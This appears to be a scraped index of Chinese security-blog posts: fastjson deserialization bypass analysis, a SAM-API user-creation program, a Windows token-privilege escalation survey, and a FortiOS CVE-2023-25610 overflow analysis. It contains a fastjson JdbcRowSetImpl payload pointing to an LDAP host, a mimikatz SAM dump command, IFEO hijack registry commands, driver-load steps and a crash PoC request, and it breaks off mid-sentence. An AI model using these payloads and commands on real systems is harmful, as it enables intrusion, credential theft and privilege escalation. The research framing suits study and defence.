TypeUtils.getClassFromMapping(typeName) == null) &#123;        throw new JSONException(&quot;autoType is not support. &quot; + typeName);      &#125;    &#125;  &#125;  // 尝试在 TypeUtils.mappings 中查找缓存的 class  if (clazz == null) &#123;    clazz = TypeUtils.getClassFromMapping(typeName);  &#125;  // 尝试在 deserializers 中查找这个类  if (clazz == null) &#123;    clazz = deserializers.findClass(typeName);  &#125;  // 如果找到了对应的 class，则会进行 return  if (clazz != null) &#123;    if (expectClass != null            &amp;&amp; clazz != java.util.HashMap.class            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;      throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());    &#125;    return clazz;  &#125;  // 如果没有开启 AutoTypeSupport ，则先匹配黑名单，在匹配白名单，与之前逻辑一致  if (!autoTypeSupport) &#123;    long hash = h3;    for (int i = 3; i &lt; className.length(); ++i) &#123;      char c = className.charAt(i);      hash ^= c;      hash *= PRIME;      if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) &#123;        throw new JSONException(&quot;autoType is not support. &quot; + typeName);      &#125;      if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) &#123;        if (clazz == null) &#123;          clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);        &#125;        if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;          throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());        &#125;        return clazz;      &#125;    &#125;  &#125;  // 如果 class 还为空，则使用 TypeUtils.loadClass 尝试加载这个类  if (clazz == null) &#123;    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);  &#125;  if (clazz != null) &#123;    if (TypeUtils.getAnnotation(clazz,JSONType.class) != null) &#123;      return clazz;    &#125;    if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger            || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver    ) &#123;      throw new JSONException(&quot;autoType is not support. &quot; + typeName);    &#125;    if (expectClass != null) &#123;      if (expectClass.isAssignableFrom(clazz)) &#123;        return clazz;      &#125; else &#123;        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());      &#125;    &#125;    JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);    if (beanInfo.creatorConstructor != null &amp;&amp; autoTypeSupport) &#123;      throw new JSONException(&quot;autoType is not support. &quot; + typeName);    &#125;  &#125;  final int mask = Feature.SupportAutoType.mask;  boolean autoTypeSupport = this.autoTypeSupport          || (features &amp; mask) != 0          || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != 0;  if (!autoTypeSupport) &#123;    throw new JSONException(&quot;autoType is not support. &quot; + typeName);  &#125;  return clazz;&#125;\n\n由以上代码可知，这里存在一个逻辑问题：autoTypeSupport 为 true 时，fastjson 也会禁止一些黑名单的类反序列化，但是有一个判断条件：当反序列化的类在黑名单中，且 TypeUtils.mappings 中没有该类的缓存时，才会抛出异常。这里就留下了一个伏笔。就是这个逻辑导致了 1.2.32 之前的版本将会受到 autoTypeSupport 的影响。\n在 autoTypeSupport 为默认的 false 时，程序直接检查黑名单并抛出异常，在这部分我们无法绕过，所以我们的关注点就在判断之前，程序有在 TypeUtils.mappings 中和 deserializers 中尝试查找要反序列化的类，如果找到了，则就会 return，这就避开下面 autoTypeSupport 默认为 false 时的检查。\n\ndeserializers ，位于 com.alibaba.fastjson.parser.ParserConfig.deserializers ，是一个 IdentityHashMap，能向其中赋值的函数有：\n\ngetDeserializer()：这个类用来加载一些特定类，以及有 JSONType 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。\n\ninitDeserializers()：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。\n\nputDeserializer()：被前两个函数调用，我们无法控制入参。\n\n\n因此我们无法向 deserializers 中写入值，也就在其中读出我们想要的恶意类。所以我们的目光转向了 TypeUtils.getClassFromMapping(typeName)。\n同样的，这个方法从 TypeUtils.mappings 中取值，这是一个 ConcurrentHashMap 对象，能向其中赋值的函数有：\n\naddBaseClassMappings()：无入参，加载\n\nloadClass()：关键函数\n\n\n接下来看一下 loadClass() 的代码：\njavapublic static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123;    //判断类名非空    if(className == null || className.length() == 0)&#123;        return null;    &#125;    //防止重复添加    Class&lt;?&gt; clazz = mappings.get(className);    if(clazz != null)&#123;        return clazz;    &#125;    //判断是否以 [ 开头    if(className.charAt(0) == &#x27;[&#x27;)&#123;        Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);        return Array.newInstance(componentType, 0).getClass();    &#125;    //判断是否以 L 开头，以;结尾    if(className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;))&#123;        String newClassName = className.substring(1, className.length() - 1);        return loadClass(newClassName, classLoader);    &#125;    try&#123;        // 如果 classLoader 非空，cache 为 true 则使用该类加载器加载并存入 mappings 中        if(classLoader != null)&#123;            clazz = classLoader.loadClass(className);            if (cache) &#123;                mappings.put(className, clazz);            &#125;            return clazz;        &#125;    &#125; catch(Throwable e)&#123;        e.printStackTrace();        // skip    &#125;    // 如果失败，或没有指定 ClassLoader ，则使用当前线程的 contextClassLoader 来加载类，也需要 cache 为 true 才能写入 mappings 中    try&#123;        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();        if(contextClassLoader != null &amp;&amp; contextClassLoader != classLoader)&#123;            clazz = contextClassLoader.loadClass(className);            if (cache) &#123;                mappings.put(className, clazz);            &#125;            return clazz;        &#125;    &#125; catch(Throwable e)&#123;        // skip    &#125;    // 如果还是失败，则使用 Class.forName 来获取 class 对象并放入 mappings 中    try&#123;        clazz = Class.forName(className);        mappings.put(className, clazz);        return clazz;    &#125; catch(Throwable e)&#123;        // skip    &#125;    return clazz;&#125;\n\n由以上代码可知，只要我们能够控制这个方法的参数，就可以往 mappings 中写入任意类名。 loadClass 一共有三个重载方法，如下图：\n\n重点在这个重载方法：\nClass&lt;?&gt; loadClass(String className, ClassLoader classLoader)：方法调用三个参数的重载方法，并添加参数 true ，也就是会加入参数缓存中\n看下他在哪里被调用了\n\n关注 com.alibaba.fastjson.serializer.MiscCodec#deserialze 方法，这个类是用来处理一些乱七八糟类的反序列化类\n\n其中就包括 Class.class 类，成为了我们的入口。\n\n定位到 com.alibaba.fastjson.serializer.MiscCodec 中的一段代码，如果 parser.resolveStatus 为 TypeNameRedirect 时，进入 if 语句，会解析 “val” 中的内容放入 objVal 中，然后传入 strVal 中。\n\n对于传入的 Class.class 的逻辑如果 class 是 Class.class 时，将会调用 loadClass 方法，将 strVal 进行类加载并缓存\n到此就完成了恶意类的加载，至于如何在第二步进入if语句。先调试一下，传入 &#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;aaaaa&quot;&#125;\n\nJSON.parseObject() 调用 DefaultJSONParser 对 JSON 进行解析。\nDefaultJSONParser.parseObject() 调用 checkAutoType() 检查待加载类的合法性。\n\n由于 deserializers 在初始化时将 Class.class 进行了加载，因此使用 findClass 可以找到，越过了后面 AutoTypeSupport 的检查。\n\nDefaultJSONParser.parseObject() 设置 resolveStatus 为 TypeNameRedirect。\n\nDefaultJSONParser.parseObject() 根据不同的 class 类型分配 deserialzer，Class 类型由 MiscCodec.deserialze() 处理。\n\n解析 json 中 “val” 中的内容，并放入 objVal 中，如果不是 “val” 将会报错。\n\n传递至 strVal 并使用 loadClass 加载并缓存。\n\n此时恶意的 val 成功被我们加载到 mappings 中，再次以恶意类进行 @type 请求时即可绕过黑名单进行的阻拦，因此最终 payload 为：\njson&#123;    &quot;a&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;,        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;: &#123;        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;: &quot;ldap://0.0.0.0:1389/CC6&quot;,        &quot;autoCommit&quot;: true    &#125;&#125;\n\nfastjson-1.2.68在 1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复，在 MiscCodec 处理 Class 类的地方，设置了cache 为 false ，并且 loadClass 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。\n这个安全修复为 fastjson 带来了一定时间的平静，直到 1.2.68 版本出现了新的漏洞利用方式。\n\n影响版本：fastjson &lt;= 1.2.68 描述：利用 expectClass 绕过 checkAutoType() ，实际上也是为了绕过安全检查的思路的延伸。主要使用 Throwable 和 AutoCloseable 进行绕过。\n\n版本 1.2.68 本身更新了一个新的安全控制点 safeMode，如果应用程序开启了 safeMode，将在 checkAutoType() 中直接抛出异常，也就是完全禁止 autoType，不得不说，这是一个一劳永逸的修复方式。\n\n但与此同时，这个版本报出了一个新的 autoType 开关绕过方式：利用 expectClass 绕过 checkAutoType()。\n在 checkAutoType() 函数中有这样的逻辑：如果函数有 expectClass 入参，且我们传入的类名是 expectClass 的子类或实现，并且不在黑名单中，就可以通过 checkAutoType() 的安全检测。\n\n接下来我们找一下 checkAutoType() 几个重载方法是否有可控的 expectClass 的入参方式，最终找到了以下几个类：\n\nThrowableDeserializer#deserialze()\nJavaBeanDeserializer#deserialze()\n\nThrowableDeserializer#deserialze() 方法直接将 @type 后的类传入 checkAutoType() ，并且 expectClass 为 Throwable.class。\n\n通过 checkAutoType() 之后，将使用 createException 来创建异常类的实例。\n\n这就形成了 Throwable 子类绕过 checkAutoType() 的方式。我们需要找到 Throwable 的子类，这个类的 getter&#x2F;setter&#x2F;static block&#x2F;constructor 中含有具有威胁的代码逻辑。\n与 Throwable 类似地，还有 AutoCloseable ，之所以使用 AutoCloseable 以及其子类可以绕过 checkAutoType() ，是因为 AutoCloseable 是属于 fastjson 内置的白名单中，其余的调用链一致，流程不再赘述。\nfastjosn-1.2.80主要将 1.2.68 Payload期望类 java.lang.AutoCloseable，java.lang.Runnable 加入了黑名单将\n议题中有两处触发点在 JSONP.toJavaObject 与 JSONPObject.toJavaObject 中\n\n\n分析 JSONPObject.toJavaObject 触发点，跟进 castToJavaBean\n\n这里通过map.get获取了@type标志后的对象\n这里有一个需要注意的点就是需要将 @type 通过 &quot;@type&quot;:&quot;java.lang.String&quot; 将其转为字符串，不然会将其后面的内容进行反序列化操作\n之后将会将其类加入缓存，并且调用了最后的return语句调用 castToJavaBean 方法\n\n之后 @type 的类是不是接口，是不是 Locale 类等等，关键的是有一个 javaBeanDeserializer 的一个获取，跟进\n\n在跟进后，看到方法尾部\n\n进行到这里有一个关键的点，bule师傅给出的调用链中有 ThrowableDeserializer.createInstance 反序列化 Exception\n至于bule师傅为何要选择该构造器，是因为反序列化 setter参数 、公有字段 、构造函数参数（无视autotype）时添加类到白名单\n所以最后回到之前讲的castToJavaBean方法中，就能够满足deserializer instanceof JavaBeanDeserializer的判断条件，将反序列化其传递给javaBeanDeser,最后调用了其createInstance方法，触发了后面的反序列化链。\n\n\n最终的调用链\ntextcom.alibaba.fastjson.JSONObject#toJavaObject    -&gt;com.alibaba.fastjson.util.TypeUtils#castToJavaBean        -&gt;com.alibaba.fastjson.parser.ParserConfig#getDeserializer            -&gt;com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#createInstance\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["WEB"],"tags":["java","反序列化","fastjson"]},{"title":"NetUserAdd逆向","url":"/2024/07/02/NetUserAdd%E9%80%86%E5%90%91/","content":"过程#直接拖ida\n\n\n跟了下逻辑然后对比了下React OS发现逻辑几乎一致，那直接扣代码。\n\nwin10上 UaspOpenDomain 没有导出，可以使用特征码搜索的方式去调用，这里跟进了发现同样是调用了sam系函数。\n\n跟一下函数还需要sid。\n\n\n发现是由 LsaQueryInformationPolicy 的获取，这个函数在 ntsecapi.h 里有描述，直接拿来用就好了。\n至此用户创建完成，然后通过 SetUserInfo 设置密码，同样这个函数在 windows 10 上没有导出。\n\n\n跟一下，发现下层函数一致并导出。\n\n\n\n跟踪了一下函数逻辑，发现不同的UserInfo都有不同的处理方法，通常我们会传入一个USERINFO1结构体，这里会把有效信息传入到一个 USER_ALL_INFORMATION 结构体里面，这个结构体的实现和Startupinfo有点像，需要同时设置值和使用标签位，阅读发现，有一个结构体单处理密码。\n\n\n这里我们只需要传入密码，然后将标志位设1。\n我们就自己封装出了一个NetUserAdd。\n完整代码#include &quot;ApiAddUser.h&quot;int wmain(int argc, wchar_t* argv[])&#123;\tUNICODE_STRING UserName;\tUNICODE_STRING PassWord;\tHANDLE ServerHandle = NULL;\tHANDLE DomainHandle = NULL;\tHANDLE UserHandle = NULL;\tULONG GrantedAccess;\tULONG RelativeId;\tNTSTATUS Status = NULL;\tHMODULE hSamlib = NULL;\tHMODULE hNtdll = NULL;\tHMODULE hNetapi32 = NULL;\tLSA_HANDLE hPolicy = NULL;\tLSA_OBJECT_ATTRIBUTES ObjectAttributes = &#123; 0 &#125;;\tPPOLICY_ACCOUNT_DOMAIN_INFO DomainInfo = NULL;\tUSER_ALL_INFORMATION uai = &#123; 0 &#125;;\thSamlib = LoadLibraryA(&quot;samlib.dll&quot;);\thNtdll = LoadLibraryA(&quot;ntdll&quot;);\tpSamConnect SamConnect = (pSamConnect)GetProcAddress(hSamlib, &quot;SamConnect&quot;);\tpSamOpenDomain SamOpenDomain = (pSamOpenDomain)GetProcAddress(hSamlib, &quot;SamOpenDomain&quot;);\tpSamCreateUser2InDomain SamCreateUser2InDomain = (pSamCreateUser2InDomain)GetProcAddress(hSamlib, &quot;SamCreateUser2InDomain&quot;);\tpSamSetInformationUser SamSetInformationUser = (pSamSetInformationUser)GetProcAddress(hSamlib, &quot;SamSetInformationUser&quot;);\tpSamQuerySecurityObject SamQuerySecurityObject = (pSamQuerySecurityObject)GetProcAddress(hSamlib, &quot;SamQuerySecurityObject&quot;);\tpRtlInitUnicodeString RtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(hNtdll, &quot;RtlInitUnicodeString&quot;);\tRtlInitUnicodeString(&amp;UserName, L&quot;Admin&quot;);\tRtlInitUnicodeString(&amp;PassWord, L&quot;Admin&quot;);\tStatus = SamConnect(NULL, &amp;ServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_LOOKUP_DOMAIN, NULL);;\tStatus = LsaOpenPolicy(NULL,&amp;ObjectAttributes,POLICY_VIEW_LOCAL_INFORMATION,&amp;hPolicy);\tStatus = LsaQueryInformationPolicy(hPolicy, PolicyAccountDomainInformation, (PVOID*)&amp;DomainInfo);\tStatus = SamOpenDomain(ServerHandle, \t\tDOMAIN_CREATE_USER | DOMAIN_LOOKUP | DOMAIN_READ_PASSWORD_PARAMETERS, \t\tDomainInfo-&gt;DomainSid, \t\t&amp;DomainHandle);\tStatus = SamCreateUser2InDomain(DomainHandle,\t\t&amp;UserName,\t\tUSER_NORMAL_ACCOUNT,\t\tUSER_ALL_ACCESS | DELETE | WRITE_DAC,\t\t&amp;UserHandle,&amp;GrantedAccess,&amp;RelativeId);\tRtlInitUnicodeString(&amp;uai.NtPassword, PassWord.Buffer);\tuai.NtPasswordPresent = TRUE;\tuai.WhichFields |= USER_ALL_NTPASSWORDPRESENT;\tStatus = SamSetInformationUser(UserHandle,\t\tUserAllInformation,\t\t&amp;uai);\treturn 0;&#125;\n\nLINKSReactOS: dll&#x2F;win32&#x2F;netapi32&#x2F;user.c File Reference\n","categories":["Windows安全"],"tags":["Re","Windows","win32api"]},{"title":"Potato 浅析","url":"/2024/04/28/Potato%E6%B5%85%E6%9E%90/","content":"简要利用思路取得了目标的访问权限后，查看可用权限\nwhoami /priv\n\n例如，普通用户具有的权限如下图\n\n管理员用户具有的权限如下图\n\niis用户具有的权限如下图\n\nPrivilege Name项表示具有的权限，State表示权限的状态，我们可以通过WinAPI AdjustTokenPrivileges将权限设置为Disabled或者Enabled\n可供参考的实现代码\n代码实现了开启指定权限(SeDebugPrivilege)，并且查看当前用户名称和具有的权限\n如果包含以下九个权限，我们就可以对其进一步利用\nSeImpersonatePrivilegeSeAssignPrimaryPrivilegeSeTcbPrivilegeSeBackupPrivilegeSeRestorePrivilegeSeCreateTokenPrivilegeSeLoadDriverPrivilegeSeTakeOwnershipPrivilegeSeDebugPrivilege\n\n注：\niis或者sqlserver的用户通常具有 SeImpersonatePrivilege 和 SeAssignPrimaryPrivilege 权限\nBackup service用户通常具有 SeBackupPrivilege 和 SeRestorePrivilege 权限\nSeImpersonatePrivilege权限的利用思路参考资料\n身份验证后模拟客户端(Impersonatea client after authentication)\n拥有该权限的进程能够模拟已有的token，但不能创建新的token\n以下用户具有该权限：\n\n本地管理员组成员和本地服务帐户\n由服务控制管理器启动的服务\n由组件对象模型 (COM) 基础结构启动的并配置为在特定帐户下运行的COM服务器\n\n通常，iis或者sqlserver用户具有该权限\n利用思路利用NTLM Relay to Local Negotiation获得System用户的Token 可使用开源工具Rotten Potato、lonelypotato或者Juicy Potato\n通过WinAPI CreateProcessWithToken创建新进程，传入System用户的Token 具有SeImpersonatePrivilege权限才能创建成功\n该Token具有System权限\n可供参考的测试代码\n代码实现了开启当前进程的SeImpersonatePrivilege权限，调用CreateProcessWithToken，传入当前进程的Token，创建一个进程，配合RottenPotato，可用来从LocalService提权至System权限\nSeAssignPrimaryPrivilege权限的利用思路参考资料\n向进程(新创建或者挂起的进程)分配token\n通常，iis或者sqlserver用户具有该权限\n利用思路1\n\n利用NTLM Relay to Local Negotiation获得System用户的Token\n通过WinAPI CreateProcessAsUser创建新进程，传入System用户的Token\n该Token具有System权限\n\n可供参考的测试代码\n代码实现了开启当前进程的SeAssignPrimaryTokenPrivilege权限，调用CreateProcessAsUser，传入当前进程的Token，创建一个进程，配合RottenPotato，可用来从LocalService提权至System权限\n利用思路2\n\n利用NTLM Relay to Local Negotiation获得System用户的Token\n通过WinAPI CreateProcess创建一个挂起的新进程，参数设置为CREATE_SUSPENDED\n通过WinAPI NtSetInformationProcess将新进程的Token替换为System用户的Token\n该Token具有System权限\n\nSeTcbPrivilege权限的利用思路参考资料\n等同于获得了系统的最高权限\n利用思路\n\n调用LsaLogonUser获得Token\n将该Token添加至Local System account组\n该Token具有System权限\n\n可供参考的测试代码\n代码实现了开启当前进程的SeTcbPrivilege权限，登录用户test1,将其添加至Local System account组，获得System权限，创建注册表项HKEY_LOCAL_MACHINE\\SOFTWARE\\testtcb\nSeBackupPrivilege权限的利用思路参考资料\n用来实现备份操作，对当前系统任意文件具有读权限\n利用思路\n\n读取注册表HKEY_LOCAL_MACHINE\\SAM、HKEY_LOCAL_MACHINE\\SECURITY和HKEY_LOCAL_MACHINE\\SYSTEM\n导出当前系统的所有用户hash mimikatz的命令如下：\n\nlsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv\n\n可供参考的测试代码\n代码实现了开启当前进程的SeBackupPrivilege权限，读取注册表，将其保存成文件C:\\\\test\\\\SAM、C:\\\\test\\\\SECURITY和C:\\\\test\\\\SYSTEM\nSeRestorePrivilege权限的利用思路参考资料\n用来实现恢复操作，对当前系统任意文件具有写权限\n利用思路1\n\n获得SeRestorePrivilege权限，修改注册表HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\n劫持exe文件的启动\n实现提权或是作为后门\n\n利用思路2\n\n获得SeRestorePrivilege权限，向任意路径写入dll文件\n实现dll劫持\n实现提权或是作为后门\n\n可供参考的测试代码\n代码实现了开启当前进程的SeRestorePrivilege权限，创建注册表项HKEY_LOCAL_MACHINE\\SOFTWARE\\testrestore\nSeCreateTokenPrivilege权限的利用思路参考资料\n用来创建Primary Token\n利用思路\n\n通过WinAPI ZwCreateToken创建Primary Token\n将Token添加至local administrator组\n该Token具有System权限\n\n可供参考的测试代码\n代码实现了开启当前进程的SeCreateTokenPrivilege权限，创建Primary Token，将其添加至local administrator组，开启SeDebugPrivilege和SeTcbPrivilege权限\nSeLoadDriverPrivilege权限的利用思路参考资料\n用来加载驱动文件\n利用思路\n\n创建驱动文件的注册表 reg add hkcu\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d &quot;\\??\\C:\\test\\Capcom.sys&quot;reg add hkcu\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1\n加载驱动文件Capcom.sys\nCapcom.sys存在漏洞，系统加载后，可从普通用户权限提升至System权限，利用代码可参考\n获得System权限\n\n可供参考的测试代码\n代码实现了开启当前进程的SeLoadDriverPrivilege权限，读取注册表项hkcu\\System\\CurrentControlSet\\CAPCOM，加载驱动文件Capcom.sys\nSeTakeOwnershipPrivilege权限的利用思路参考资料\n同SeRestorePrivilege类似，对当前系统任意文件具有写权限\n利用思路1\n\n获得SeTakeOwnershipPrivilege权限，修改注册表HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\n劫持exe文件的启动\n实现提权或是作为后门\n\n利用思路2\n\n获得SeTakeOwnershipPrivilege权限，向任意路径写入dll文件\n实现dll劫持\n实现提权或是作为后门\n\n可供参考的测试代码\n代码实现了开启当前进程的SeTakeOwnershipPrivilege权限，修改注册表项hklm\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options的权限，普通用户权限对其具有完整操作权限\n后续的写操作：\nreg add &quot;hklm\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options&quot; /v takeownership /t REG_SZ /d &quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;\n\nSeDebugPrivilege权限的利用思路参考资料\n用来调试指定进程，包括读写内存，常用作实现dll注入\n利用思路\n\n找到System权限的进程\ndll注入\n获得System权限\n\n可供参考的测试代码\n代码实现了开启当前进程的SeDebugPrivilege权限，向指定进程注入dll\n参考Hot Potatopowershell版本Hot Potato： Rotten PotatolonelypotatoJuicy Potatohttps://github.com/hatRiot/token-privhttps://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/https://foxglovesecurity.com/2016/01/16/hot-potato/https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/\n","categories":["Windows安全"],"tags":["Windows","提取"]},{"title":"CVE-2022-25610 分析","url":"/2023/04/01/CVE-2023-25610%20%E5%88%86%E6%9E%90/","content":"国内推荐这里下载，国外镜像太慢了\n2023 年 3 月 7 日，Fortinet 发布了影响 FortiOS 管理端口的漏洞 CVE-2023-25610，官方解释该漏洞为 “堆内存下溢”，通过利用此漏洞，未经授权的攻击者可能实现任意代码执行，本文对该漏洞进行分析。\n漏洞分析关于 FortiOS 本博客中包含如何通过授权验证以及复现漏洞时的基本思路。\n同理，针对此漏洞，我们可以通过补丁对比的方式来分析，或者是编写一些 FUZZ 脚本进行测试。\n考虑 FortiOS 曾经出现过的缓冲区溢出类漏洞，包括近期的 CVE-2022-42475，猜测 CVE-2023-25610 应该也是出现在解析 HTTP 请求过程中。在进行补丁对比时我们重点关注处理请求的相关函数，最终找到疑似关键位置 util_read，此函数在 7.x 新旧版本代码如下\n伪代码// oldunsigned __int64 __fastcall util_read(__int64 a1, void **a2, _DWORD *a3)&#123;  int v3; // er15  __int64 v5; // rbx  apr_pool_t *v6; // rdi  void *v7; // rax  int v8; // er14  int v9; // edx  char *v10; // rdi  int v11; // eax  char src[8200]; // [rsp+10h] [rbp-2040h] BYREF  unsigned __int64 v15; // [rsp+2018h] [rbp-38h]  v3 = 0;  v5 = *(_QWORD *)(a1 + 216);  v6 = *(apr_pool_t **)a1;  v15 = __readfsqword(0x28u);  v7 = apr_palloc(v6, v5 + 1);  *a2 = memset(v7, 0, v5 + 1);  while ( 1 )  &#123;    v11 = ap_get_client_block(a1, src, 0x2000LL);    v9 = v11;    if ( v11 &lt;= 0 )      break;    v8 = v3 + v11;    if ( v5 &lt; v3 + v11 )    &#123;      v8 = v5;      v9 = v5 - v3;    &#125;    v10 = (char *)*a2 + v3;    v3 = v8;    memcpy(v10, src, v9);  &#125;  if ( a3 )    *a3 = v3;  return v15 - __readfsqword(0x28u);&#125;\n\n伪代码// new__int64 __fastcall util_read(_QWORD *a1, char **a2, int *a3)&#123;  unsigned int v4; // er13  __int64 v6; // r14  _BYTE *v7; // rax  __int64 v8; // rdx  int v9; // er14  size_t v10; // r15  void *v11; // rax  size_t v12; // rdx  int v13; // er15  char *v14; // rax  char *i; // rsi  int v16; // eax  int v18; // [rsp+Ch] [rbp-34h]  if ( sub_22038F0(11, a2) )  &#123;    v4 = 500;    sub_CA4A60();  &#125;  else  &#123;    v6 = sub_22CDE00(*(qword_F34CC20 + 88));    v7 = sub_CA4A60();    if ( v6 )    &#123;      if ( v7 &amp;&amp; *v7 )        v18 = *(v6 + 1588);      else        v18 = *(v6 + 1592);      v4 = 400;      if ( a1[27] &lt;= 0x7FFFFFFFuLL )      &#123;        v4 = ap_setup_client_block(a1, 1LL);        if ( !v4 )        &#123;          if ( ap_should_client_block(a1) )          &#123;            v8 = a1[27];            v9 = v8;            if ( v8 &lt;= 0 || v18 &lt; v8 )            &#123;LABEL_20:              v4 = 413;            &#125;            else            &#123;              v10 = v8 + 1;              v11 = apr_palloc(*a1, v10);              v12 = v10;              v13 = 0;              v14 = memset(v11, 0, v12);              *a2 = v14;              for ( i = v14; ; i = *a2 )              &#123;                v16 = ap_get_client_block(a1, &amp;i[v13], v9 - v13);                if ( v16 &lt;= 0 )                  break;                v13 += v16;                if ( v13 &lt;= v9 )                &#123;                  if ( v13 &gt; v18 )                    goto LABEL_20;                &#125;                else                &#123;                  v13 = v9;                &#125;              &#125;              if ( a3 )                *a3 = v13;            &#125;          &#125;        &#125;      &#125;    &#125;    else    &#123;      v4 = 500;    &#125;  &#125;  return v4;&#125;\n\n经过分析确认，此函数用来处理 POST 请求体数据。我们看到它发生了显著变化，新版中添加了一系列大小检查。\n那么问题出现在哪里呢？函数中 a1 + 216 变量对应 apache request_rec 结构中的 remaining 成员(可能)，表示 body 中还剩余的数据长度。代码获取到这个值(v5)，并分配 v5 + 1 大小的内存(记为 heap_start)供后续使用。\n随后进入循环，调用 ap_get_client_block 函数每次从请求中获取 0x2000 大小的数据块，将它拷贝到 heap_start 。这里注意到存在一个 int 类型变量 v3，汇编对应 32 位寄存器。循环中不断对它进行累加操作，但循环的边界依靠 int64 类型变量来判断，所以当传入了较多的数据时，变量 v3 将发生整数溢出，回绕成一个负数。\n当 v3 变成负数时，代码继续调用 memcpy 尝试将数据块拷贝到堆内存。此时新的目的地址变成 heap_start 减去某值，数据将被拷贝到 heap_start 的低地址方向，可能导致未定义的行为。\n根据以上分析，想要让 v3 发生整数溢出，至少要在请求体中构造 2GB 的数据。这一点可能难以实现，本文暂不做进一步讨论。\nFortiGate 有几个不同的版本系列，而这个漏洞在不同版本中的形态不同，我们以 6.0.x 为例再次分析。\n伪代码unsigned __int64 __fastcall util_read(_QWORD *a1, _QWORD *a2, _DWORD *a3)&#123;  int v4; // ebx  int v5; // er15  int v6; // er13  void *v7; // rdi  int v8; // eax  __int64 v11; // [rsp+18h] [rbp-2048h]  char src[8200]; // [rsp+20h] [rbp-2040h] BYREF  unsigned __int64 v13; // [rsp+2028h] [rbp-38h]  v4 = 0;  v13 = __readfsqword(0x28u);  v11 = a1[26];  *a2 = sub_CC3750(*a1, (unsigned int)(v11 + 1));  sub_CDB860(&quot;[libapreq] util_read&quot;, a1);  while ( 1 )  &#123;    v8 = sub_CE2BA0(a1, src, 0x2000LL);    v6 = v8;    if ( v8 &lt;= 0 )      break;    v5 = v4 + v8;    sub_CDB770(a1);    if ( v11 &lt; v5 )    &#123;      v6 = v11 - v4;      v5 = v11;    &#125;    v7 = (void *)(*a2 + v4);    v4 = v5;    memcpy(v7, src, v6);  &#125;  sub_CDB8B0(a1);  if ( a3 )    *a3 = v4;  return __readfsqword(0x28u) ^ v13;&#125;\n\n逻辑和 7.x 大体相同，但是存在几个关键差异。首先分配内存时不使用 remaining 字段，而是直接使用 Content-Length 的值。第二，alloc 执行 + 1 操作时会将 __int64 类型变量强制转换为 unsigned int 类型，存在整数溢出，这一点和历史漏洞 CVE-2022-42475 相似。\n我们构造较大的 Content-Length 值，在 alloc 时发生 int 溢出截断，导致分配了较小的内存空间，而后续循环拷贝数据时又使用了较大的 CL 值，最终将导致堆内存溢出。\n利用分析复现该漏洞时遇到的一些问题:\n\n本文提及的利用分析基于 TLSv1.3，在其他 TLS 版本上可能存在差异。\n如果使用脚本和服务进行交互，需要注意 openssl 版本问题，比如 python 建议使用 3.11 以上版本。\n\n首先来构造一个可以触发漏洞的 PoC，根据之前的分析，在 POST 请求中伪造一个较大的 Content-Length 值，然后在请求体中填充随机数据，例如\nrequestPOST /login HTTP/1.1Host: 192.168.232.151Content-Length: 4296015872User-Agent: Mozilla/5.0Connection: close&lt;random_long_data&gt;\n\n在 httpsd 进程上挂载调试器，然后发送请求，得到以下结果：\n\n段错误导致程序崩溃，观察崩溃的地址，rdi 是一个越界的堆地址，通过查看栈回溯地址，崩溃就发生在 util_read 的 memcpy 位置，拷贝数据时目的地址已经越界。\n根据以往的 sslvpn 利用经验，我们可以通过堆溢出覆盖请求的 SSL 结构体，控制函数指针来劫持程序流程。但是 SSL 结构体通常被分配在 0x7f 开头的高地址，而发生越界的位置在较低地址，无法直接覆盖 SSL 结构。\n\n参考历史资料发现，fortios 中内存分配部分使用了 jemalloc，这种内存管理策略中包含地址重用以及针对较大的分配请求重新映射一块内存等机制。\n在 PoC 中我们构造的 CL 值为 0x100100000，分配的内存位于低地址，我们尝试扩大 CL 